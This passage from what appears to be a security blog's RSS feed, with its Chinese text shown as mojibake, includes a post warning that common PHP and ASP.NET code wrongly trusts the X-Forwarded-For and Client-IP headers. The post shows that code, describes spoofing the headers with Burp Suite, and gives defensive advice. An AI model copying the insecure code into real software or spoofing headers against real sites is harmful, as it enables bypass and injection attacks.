&lt;p&gt;é‡£é­šæ”»æ“Šæœ€æ—©å¾ 1995 å¹´å°±é–‹å§‹ç››è¡Œï¼Œä¸€ç›´åˆ°å¿« 20 å¹´å¾Œçš„ä»Šå¤©ï¼Œéƒ½é‚„æ˜¯ä¸€å€‹éå¸¸ç°¡å–®åˆæœ‰æ•ˆç‡çš„æ”»æ“Šæ‰‹æ³•ã€‚æ”¶åˆ°éƒµä»¶åƒè¬åˆ¥å‚»å‚»çš„è¼¸å…¥è‡ªå·±çš„å€‹è³‡ã€å¸³è™Ÿå¯†ç¢¼ï¼Œä»”ç´°çœ‹ä¸€ä¸‹æ”»æ“Šè€…çš„ç ´ç¶»ï¼Œåˆ¥è®“ä»–å¾—é€äº†ã€‚&lt;/p&gt;

&lt;p&gt;å¦‚æœæœ‰ç™¼ç¾ç–‘ä¼¼é‡£é­šç¶²ç«™ï¼Œåˆç„¡æ³•ç¢ºèªï¼Œå¯ä»¥åˆ° &lt;a href=&quot;http://www.phishtank.com/&quot;&gt;PhishTank&lt;/a&gt; ä¾†æŸ¥æŸ¥çœ‹ï¼Œæ‰¾åˆ°é‡£é­šç¶²ç«™ä¹Ÿå¯ä»¥æŠ•ç¨¿ä¸€ä¸‹å¹«åŠ©å…¶ä»–äººï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/07/03/apple-id-phishing-scam/</link>
                <guid>https://devco.re/blog/2014/07/03/apple-id-phishing-scam</guid>
                <pubDate>Thu, 03 Jul 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>å¦‚ä½•æ­£ç¢ºçš„å–å¾—ä½¿ç”¨è€… IPï¼Ÿ</title>
                <description>&lt;p&gt;å¾ˆå¤šç¶²ç«™éƒ½æœƒæœ‰åµæ¸¬ä½¿ç”¨è€… IP çš„åŠŸèƒ½ï¼Œä¸ç®¡æ˜¯åˆ¤æ–·ä½¿ç”¨è€…ä¾†è‡ªå“ªé‚Šï¼Œæˆ–è€…æ˜¯è¨˜éŒ„ä½¿ç”¨è€…çš„ä½ç½®ã€‚ä½†æ˜¯ä½ çŸ¥é“å—ï¼Ÿç¶²è·¯ä¸Šå¤§å¤šæ•¸çš„æ•™å­¸å…¨éƒ¨éƒ½æ˜¯ã€ŒéŒ¯èª¤ã€çš„ã€‚æ­£ç¢ºçš„ç¨‹å¼å¯«æ³•å¯ä»¥ç¢ºä¿çŸ¥é“è¨ªå®¢çš„ IPï¼Œä½†æ˜¯éŒ¯èª¤çš„å¯«æ³•å»å¯èƒ½è®“ç¶²ç«™ç®¡ç†è€…æ°¸é ä¸çŸ¥é“çŠ¯ç½ªè€…çš„ä¾†æºã€‚&lt;/p&gt;

&lt;p&gt;é€™æ¬¡æˆ‘å€‘å–®å°±åµæ¸¬ IP çš„è­°é¡Œä¾†æ¢è¨å„ç¨®éŒ¯èª¤çš„å¯«æ³•ã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;ä½ çŸ¥é“ç¶²è·¯ä¸Šçš„æ•™å­¸æ˜¯ä¸å®‰å…¨çš„å—&quot;&gt;ä½ çŸ¥é“ç¶²è·¯ä¸Šçš„æ•™å­¸æ˜¯ä¸å®‰å…¨çš„å—ï¼Ÿ&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘å…ˆä¾†çœ‹ä¸€ä¸‹ç¶²è·¯ä¸Šçš„æ•™å­¸ï¼Œè®“æˆ‘å€‘ Google æ‰¾ä¸€ä¸‹ã€Œ&lt;a href=&quot;https://www.google.com.tw/search?q=php+å–å¾—+ip&quot;&gt;PHP å–å¾— IP&lt;/a&gt;ã€ï¼Œå°±å¯ä»¥çœ‹åˆ°è¨±å¤šäººç†±å¿ƒçš„æ•™å­¸ï¼Œæˆ‘å€‘éš¨æ„æŒ‘ä¸€å€‹å¸¸è¦‹çš„æ•™å­¸ä¾†çœ‹çœ‹ã€‚&lt;/p&gt;

&lt;p&gt;ä»¥ PHP ç‚ºä¾‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_CLIENT_IP&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_CLIENT_IP&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;empty&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])){&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;HTTP_X_FORWARDED_FOR&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
   &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;ä»¥ ASP.NET ç‚ºä¾‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c#&quot; data-lang=&quot;c#&quot;&gt;&lt;span class=&quot;n&quot;&gt;Dim&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;As&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;HTTP_X_FORWARDED_FOR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Empty&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Then&lt;/span&gt; 
 &lt;span class=&quot;n&quot;&gt;ClientIP&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ServerVariables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&amp;quot;REMOTE_ADDR&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; 
&lt;span class=&quot;n&quot;&gt;End&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;é€™æ˜¯ä¸€å€‹å¾ˆåŸºæœ¬çš„å¯«æ³•ã€å¾ˆæ­£ç¢ºçš„æƒ³æ³•ï¼Œå¦‚æœ HTTP Header ä¸­åŒ…å«ã€ŒClient-IPã€ï¼Œå°±å…ˆä»¥ä»–ç•¶ä½œçœŸå¯¦ IPã€‚è‹¥åŒ…å«ã€ŒX-Forwarded-Forã€ï¼Œå‰‡å–ä»–ç•¶ä½œçœŸå¯¦ IPã€‚è‹¥å…©è€…éƒ½æ²’æœ‰ï¼Œå‰‡å–ã€ŒREMOTE_ADDRã€è®Šæ•¸ä½œç‚ºçœŸå¯¦ IPã€‚å› ç‚ºç•¶ä½¿ç”¨è€…é€£ç·šæ™‚é€éä»£ç†ä¼ºæœå™¨æ™‚ï¼ŒREMOTE_ADDR æœƒé¡¯ç¤ºç‚ºä»£ç†ä¼ºæœå™¨ Proxy çš„ IPã€‚éƒ¨åˆ†ä»£ç†ä¼ºæœå™¨æœƒå°‡ä½¿ç”¨è€…çš„åŸå§‹çœŸå¯¦ IP æ”¾åœ¨ Client-IP æˆ– X-Forwarded-For header ä¸­å‚³éï¼Œå¦‚æœåœ¨è®Šæ•¸ä¸­å‘¼å«å‰‡å¯ä»¥å–å¾—çœŸå¯¦ IPã€‚&lt;/p&gt;

&lt;p&gt;ä½†æ˜¯ä½ çŸ¥é“å—ï¼Ÿ&lt;strong&gt;ç¶²è·¯ä¸Š 80% çš„æ•™å­¸å¯«æ³•å…¨éƒ¨éƒ½æ˜¯ã€ŒéŒ¯èª¤ã€çš„ã€‚&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;ç‚ºä»€éº¼é€™æ¨£èªªå‘¢ï¼Ÿè«‹å¤§å®¶è¨˜å¾—ä¸€ä»¶äº‹æƒ…ï¼šã€Œ&lt;strong&gt;ä»»ä½•å¾å®¢æˆ¶ç«¯å–å¾—çš„è³‡æ–™éƒ½æ˜¯ä¸å¯ä¿¡ä»»çš„ï¼&lt;/strong&gt;ã€&lt;/p&gt;

&lt;h3 id=&quot;ç«„æ”¹-http-header&quot;&gt;ç«„æ”¹ HTTP Header&lt;/h3&gt;

&lt;p&gt;ã€ŒX-Forwarded-Forã€é€™å€‹è®Šæ•¸é›–ç„¶ã€Œæœ‰æ©Ÿæœƒã€å–å¾—ä½¿ç”¨è€…çš„çœŸå¯¦ IPï¼Œä½†æ˜¯ç”±æ–¼é€™å€‹å€¼æ˜¯å¾å®¢æˆ¶ç«¯å‚³é€éä¾†çš„ï¼Œæ‰€ä»¥ã€Œæœ‰å¯èƒ½ã€è¢«ä½¿ç”¨è€…ç«„æ”¹ã€‚&lt;/p&gt;

&lt;p&gt;èˆ‰ä¾‹ä¾†èªªï¼Œæˆ‘å¯«äº†ä¸€å€‹å°ç¨‹å¼ï¼Œåµæ¸¬é€™äº›å¸¸è¦‹çš„ HTTP Header åˆ¤æ–· IPã€‚ä¸¦ä¸”ä½¿ç”¨ &lt;a href=&quot;http://portswigger.net/burp/&quot;&gt;Burp Suite&lt;/a&gt; é€™å€‹å·¥å…·ä¾†ä¿®æ”¹ HTTP Requestã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-01-detech-user-ip.png&quot; alt=&quot;é¡¯ç¤ºç›®å‰ IP ä»¥åŠç›¸é—œ header&quot; title=&quot;é¡¯ç¤ºç›®å‰ IP ä»¥åŠç›¸é—œ header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;é é¢ä¸Šé¡¯ç¤ºç›®å‰æˆ‘ç›®å‰çš„ IPã€Œ49.50.68.17ã€ï¼Œä¸¦ä¸”å…¶ä»–çš„ header æ˜¯ç©ºçš„ã€‚ä½†å¦‚æœæˆ‘ä»Šå¤©ä½¿ç”¨ Burp Suite ä¹‹é¡çš„ Proxy å·¥å…·è‡ªè¡Œç«„æ”¹å°åŒ…ï¼ŒåŠ ä¸Š X-Forwarded-For æˆ–æ˜¯ Client-IP headerï¼š&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-02-burp-suite-add-http-header.png&quot; alt=&quot;ä½¿ç”¨ Burp Suite ä¿®æ”¹ HTTP Request Header&quot; title=&quot;ä½¿ç”¨ Burp Suite ä¿®æ”¹ HTTP Request Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;ä¿®æ”¹å®Œç•¢ä¹‹å¾Œï¼Œå†åˆ°åŸæœ¬çš„é¡¯ç¤º IP ä»‹é¢ï¼Œæœƒç™¼ç¾ç¶²é éŒ¯å°‡æˆ‘ç«„æ”¹çš„ header ç•¶ä½œæ­£ç¢ºçš„è³‡æ–™å¡«å…¥ã€‚&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-03-detech-user-ip.png&quot; alt=&quot;é¡¯ç¤ºé­åˆ°ç«„æ”¹çš„ HTTP Header&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;ä½¿ç”¨ä»£ç†ä¼ºæœå™¨-proxy-çš„æƒ…æ³&quot;&gt;ä½¿ç”¨ä»£ç†ä¼ºæœå™¨ Proxy çš„æƒ…æ³&lt;/h3&gt;

&lt;p&gt;ä½¿ç”¨ä»£ç†ä¼ºæœå™¨çš„æƒ…æ³ä¸‹ï¼ŒHTTP Header æœƒæœ‰ä¸åŒçš„è¡Œç‚ºã€‚ä¾‹å¦‚ Elite Proxy å¦‚ä½•éš±è—å®¢æˆ¶ç«¯çš„çœŸå¯¦ IPã€‚ä»¥ä¸‹ç°¡å–®ä»‹ç´¹å¹¾ç¨®å¸¸è¦‹çš„ç‹€æ³çµ¦å„ä½åƒè€ƒã€‚&lt;/p&gt;

&lt;h4 id=&quot;ç›´æ¥é€£ç·š-æ²’æœ‰ä½¿ç”¨-proxy&quot;&gt;ç›´æ¥é€£ç·š ï¼ˆæ²’æœ‰ä½¿ç”¨ Proxyï¼‰&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: å®¢æˆ¶ç«¯çœŸå¯¦ IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ç„¡&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: ç„¡&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;transparent-proxy&quot;&gt;Transparent Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: æœ€å¾Œä¸€å€‹ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: å®¢æˆ¶ç«¯çœŸå¯¦ IPï¼Œå¾Œä»¥é€—é»ä¸²æ¥å¤šå€‹ç¶“éçš„ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;anonymous-proxy&quot;&gt;Anonymous Proxy&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: æœ€å¾Œä¸€å€‹ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: ä»£ç†ä¼ºæœå™¨ IPï¼Œå¾Œä»¥é€—é»ä¸²æ¥å¤šå€‹ç¶“éçš„ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;high-anonymity-proxy-elite-proxy&quot;&gt;High Anonymity Proxy (Elite Proxy)&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;REMOTE_ADDR: ä»£ç†ä¼ºæœå™¨ IP&lt;/li&gt;
  &lt;li&gt;HTTP_VIA: ç„¡&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR: ç„¡ (æˆ–ä»¥é€—é»ä¸²æ¥å¤šå€‹ç¶“éçš„ä»£ç†ä¼ºæœå™¨ IP)&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;å¯¦éš›æƒ…æ³&quot;&gt;å¯¦éš›æƒ…æ³&lt;/h3&gt;

&lt;p&gt;åœ¨æˆ‘å€‘æ¸¬è©¦çš„éç¨‹ä¸­ï¼Œé€šå¸¸æˆ‘å€‘éƒ½æœƒè®“ç€è¦½å™¨è‡ªå¸¶ X-Forwarded-Forï¼Œä¸¦ä¸”è‡ªè¡Œå¡«å…¥ IPã€‚å¸¸å¸¸æœƒç™¼ç¾æœ‰ä¸€äº›ç¶²ç«™å‡ºç¾å¦‚ä¸‹çš„è­¦å‘Šâ€¦&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140619/2014-06-12-client-ip-detection-04-discuz-user-ip.png&quot; alt=&quot;Discuz! é¡¯ç¤º IP éŒ¯èª¤&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;æœ‰æ²’æœ‰æéŒ¯ï¼Ÿã€Œä¸Šæ¬¡ç™»å…¥ä½ç½® 127.0.0.1ã€ï¼Ÿæ²’éŒ¯ï¼Œé€™å€‹æ˜¯çŸ¥åè«–å£‡å¥—ä»¶ã€Œ&lt;a href=&quot;http://www.discuz.net/&quot;&gt;Discuz!&lt;/a&gt;ã€çš„åŠŸèƒ½ï¼ŒæŠ“å– IP çš„åŠŸèƒ½ä¹Ÿæ˜¯ä¸å®‰å…¨çš„å¯«æ³•ã€‚ä¹Ÿæœ‰é€™æ¨£çš„ç¶“é©—ï¼Œä¹‹å‰é–‹è‘— X-Forwarded-For çš„ header åˆ°ä¸€äº›ç¶²ç«™ï¼Œç«Ÿç„¶ç›´æ¥å‡ºç¾ç®¡ç†è€…å¾Œå°ï¼&lt;/p&gt;

&lt;p&gt;ä½ è¦ºå¾—åªæœ‰ä¸€èˆ¬äººæ’°å¯«çš„ç¨‹å¼æœƒæœ‰é€™æ¨£çš„å•é¡Œå—ï¼Ÿå…¶å¯¦å¤§å‹ç¶²ç«™ä¹Ÿå¯èƒ½æœƒæœ‰é¡ä¼¼çš„å•é¡Œã€‚é€™æ¨£çš„å¯«æ³•å¯èƒ½æœƒè®“ç®¡ç†è€…æ°¸é æŠ“ä¸åˆ°çŠ¯ç½ªè€…çš„çœŸå¯¦ IPï¼Œç”šè‡³æ”»æ“Šè€…å¯ä»¥ç«„æ”¹ header æ’å…¥ç‰¹æ®Šå­—å…ƒï¼Œå°ç¶²ç«™é€²è¡Œ SQL Injection æˆ–è€… Cross-Site Scripting æ”»æ“Šã€‚&lt;/p&gt;

&lt;h3 id=&quot;æ­£ç¢ºåˆå®‰å…¨çš„æ–¹å¼&quot;&gt;æ­£ç¢ºåˆå®‰å…¨çš„æ–¹å¼&lt;/h3&gt;

&lt;p&gt;ã€Œ&lt;strong&gt;ä»»ä½•å¾å®¢æˆ¶ç«¯å–å¾—çš„è³‡æ–™éƒ½æ˜¯ä¸å¯ä¿¡ä»»çš„ï¼&lt;/strong&gt;ã€&lt;/p&gt;

&lt;p&gt;è«‹å„ä½é–‹ç™¼è€…ã€ç®¡ç†è€…è¨˜ä½é€™å€‹å¤§åŸå‰‡ï¼Œé›–ç„¶é€™äº› Request Header å¯èƒ½å«æœ‰çœŸå¯¦ IP çš„è³‡è¨Šï¼Œä½†æ˜¯å› ç‚ºä»–çš„å®‰å…¨æ€§ä¸é«˜ï¼Œå› æ­¤æˆ‘å€‘çµ•å°ä¸èƒ½å®Œå…¨ä¿¡è³´é€™å€‹æ•¸å€¼ã€‚&lt;/p&gt;

&lt;p&gt;é‚£æˆ‘å€‘è©²æ€éº¼è™•ç†å‘¢ï¼Ÿæˆ‘çš„å»ºè­°æ˜¯è¨˜éŒ„æ‰€æœ‰ç›¸é—œçš„ header æ¬„ä½å­˜å…¥è³‡æ–™åº«ï¼ŒåŒ…å«ã€ŒREMOTE_ADDRã€ã€ŒX-Forwarded-Forã€ç­‰ç­‰ï¼ŒçœŸæ­£æœ‰çŠ¯ç½ªäº‹ä»¶ç™¼ç”Ÿæ™‚ï¼Œå°±å¯ä»¥èª¿å‡ºæ‰€æœ‰å®Œæ•´çš„ IP è³‡è¨Šé€²è¡Œäººå·¥åˆ¤æ–·ï¼Œæ‰¾å‡ºçœŸæ­£çš„ IPã€‚ç•¶ç„¶å¾ header å­˜å…¥çš„æ•¸å€¼ä¹Ÿå¯èƒ½æœƒé­åˆ°æ”»æ“Šè€…ç«„æ”¹æ’å…¥ç‰¹æ®Šå­—å…ƒå˜—è©¦ SQL Injectionï¼Œå› æ­¤å­˜å…¥å€¼å¿…é ˆå…ˆç¶“ééæ¿¾ï¼Œæˆ–è€…ä½¿ç”¨ Prepared Statement é€²è¡Œå­˜æ”¾ã€‚&lt;/p&gt;

&lt;p&gt;å¯ä»¥åƒè€ƒçš„ HTTP Headerï¼ˆä¾ç…§å¯èƒ½å­˜æ”¾çœŸå¯¦ IP çš„é †åºï¼‰&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HTTP_CLIENT_IP&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED_FOR&lt;/li&gt;
  &lt;li&gt;HTTP_X_FORWARDED&lt;/li&gt;
  &lt;li&gt;HTTP_X_CLUSTER_CLIENT_IP&lt;/li&gt;
  &lt;li&gt;HTTP_FORWARDED_FOR&lt;/li&gt;
  &lt;li&gt;HTTP_FORWARDED&lt;/li&gt;
  &lt;li&gt;REMOTE_ADDR (çœŸå¯¦ IP æˆ–æ˜¯ Proxy IP)&lt;/li&gt;
  &lt;li&gt;HTTP_VIA (åƒè€ƒç¶“éçš„ Proxy)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ã€Œé§­å®¢æ€ç¶­ã€å°±æ˜¯æ‰¾å‡ºç¶²ç«™ä»»ä½•å¯èƒ½ç«„æ”¹çš„å¼±é»ï¼Œå¾ç¶²é ä¸Šçš„å…ƒç´ åˆ° HTTP Header éƒ½æ˜¯å˜—è©¦çš„å°è±¡ã€‚å› æ­¤èº«ç‚ºé˜²ç¦¦è€…ä¸€å®šè¦æ¸…æ¥šçš„çŸ¥é“å“ªäº›æ•¸å€¼æ˜¯ä¸èƒ½ä¿¡è³´çš„ï¼Œä¸è¦å†åƒè€ƒç¶²è·¯ä¸ŠéŒ¯èª¤çš„æ•™å­¸äº†ï¼&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2014/06/19/client-ip-detection/</link>
                <guid>https://devco.re/blog/2014/06/19/client-ip-detection</guid>
                <pubDate>Thu, 19 Jun 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Zone Transfer Statistics of Alexa Top 1 Million</title>
                <description>&lt;h3 id=&quot;zone-transfer-ä¸–ç•Œå¤§æ­ç§˜&quot;&gt;Zone Transfer ä¸–ç•Œå¤§æ­ç§˜&lt;/h3&gt;

&lt;p&gt;é‚„è¨˜å¾—åœ¨ä¸Šä¸€ç¯‡æ–‡ç«  &lt;a href=&quot;https://devco.re/blog/2014/05/05/zone-transfer-CVE-1999-0532-an-old-dns-security-issue/&quot;&gt;Zone Transfer CVE-1999-0532 - å¤è€çš„ DNS è³‡å®‰è­°é¡Œ&lt;/a&gt;ä¸­æˆ‘å€‘æ›¾æåˆ°ï¼Œè‹¥å°å…¨ä¸–ç•Œçš„ç¶²ç«™é€²è¡Œ zone transfer æª¢æ¸¬ææ€•æœƒæœ‰æ›´å¤šé©šäººçš„æ¡ˆä¾‹å—ï¼Ÿæ­£å¥½ &lt;a href=&quot;http://s3.amazonaws.com/alexa-static/top-1m.csv.zip&quot;&gt;Alexa æä¾›äº†å…¨çƒæ’åå‰ä¸€ç™¾è¬åçš„ç¶²ç«™è³‡æ–™&lt;/a&gt;ï¼Œæˆ‘å€‘å°±ä»¥é€™ä»½è³‡æ–™ç‚ºåŸºç¤ä¾†åšä¸€äº›çµ±è¨ˆå§ï¼&lt;/p&gt;

&lt;h3 id=&quot;æœ‰å•é¡Œçš„-domain-ç¸½æ•¸èˆ‡æ¯”ä¾‹&quot;&gt;æœ‰å•é¡Œçš„ domain ç¸½æ•¸èˆ‡æ¯”ä¾‹&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;79133ï¼Œç´„ä½”æ‰€æœ‰å—æ¸¬ç›®æ¨™çš„ 8.014%&lt;/li&gt;
  &lt;li&gt;ä¸Šè¿° domain çš„æ‰€æœ‰ zone file å…±å«æœ‰ 22631804 ç­† DNS è¨˜éŒ„&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç”±æ–¼åœ¨ Alexa Top 1M ä¸­æœ‰è¨±å¤šè³‡æ–™æ˜¯é‡è¤‡çš„ domainï¼Œå¦å¤–ä¹Ÿæœ‰äº›è³‡æ–™æ˜¯ IPï¼Œåœ¨æœ¬æ¬¡çš„æª¢æ¸¬ç•¶ä¸­éƒ½ä¸åˆ—å…¥è¨ˆç®—ï¼Œå› æ­¤å—æ¸¬ domain ç¸½æ•¸åƒ…æœ‰ 987447 å€‹ï¼Œè€Œéä¸€ç™¾è¬å€‹ã€‚å¦å¤–ï¼Œæœ¬æ¬¡æƒæç‚ºæ±‚å¿«é€ŸçŠ§ç‰²äº†éƒ¨åˆ†æº–ç¢ºç‡ï¼Œå› æ­¤å¯¦éš›æ•¸é‡æ‡‰æ¯” 79133 æ›´å¤šã€‚&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;æœ‰å•é¡Œçš„-top-level-domain-tld-æ•¸é‡&quot;&gt;æœ‰å•é¡Œçš„ Top-Level Domain (TLD) æ•¸é‡&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;å…¨ä¸–ç•Œ TLD ç¸½æ•¸ï¼š567&lt;/li&gt;
  &lt;li&gt;å—æ¸¬ç›®æ¨™çš„ TLD ç¸½æ•¸ï¼š316ï¼Œä½”å…¨ä¸–ç•Œç¸½æ•¸çš„ 55.73%&lt;/li&gt;
  &lt;li&gt;æœ‰ zone transfer å•é¡Œçš„ TLD ç¸½æ•¸ï¼š220ï¼Œä½”å—æ¸¬ç›®æ¨™çš„ 69.62%&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ç›®å‰ TLD ç¸½æ•¸çš„æ•¸æ“šå–è‡ªæ–¼ &lt;a href=&quot;https://data.iana.org/TLD/tlds-alpha-by-domain.txt&quot;&gt;Internet Assigned Numbers Authority (IANA)&lt;/a&gt;ï¼Œä¸äº†è§£ TLD æ˜¯ä»€éº¼çš„äººå¯ä»¥åƒè€ƒ&lt;a href=&quot;http://en.wikipedia.org/wiki/Top-level_domain&quot;&gt;é€™ç¯‡ç¶­åŸºç™¾ç§‘æ–‡ç« &lt;/a&gt;ã€‚&lt;/p&gt;

&lt;p&gt;æœ‰è¶£çš„æ˜¯ï¼Œé€£ä¸€äº›æ–°çš„ TLD éƒ½æœ‰ zone transfer å•é¡Œï¼Œä¾‹å¦‚ .technologyã€.museum ç­‰ç­‰ï¼Œå¯è¦‹é€™çœŸçš„å¾ˆå®¹æ˜“è¢«å¤§å®¶å¿½ç•¥ï½&lt;/p&gt;

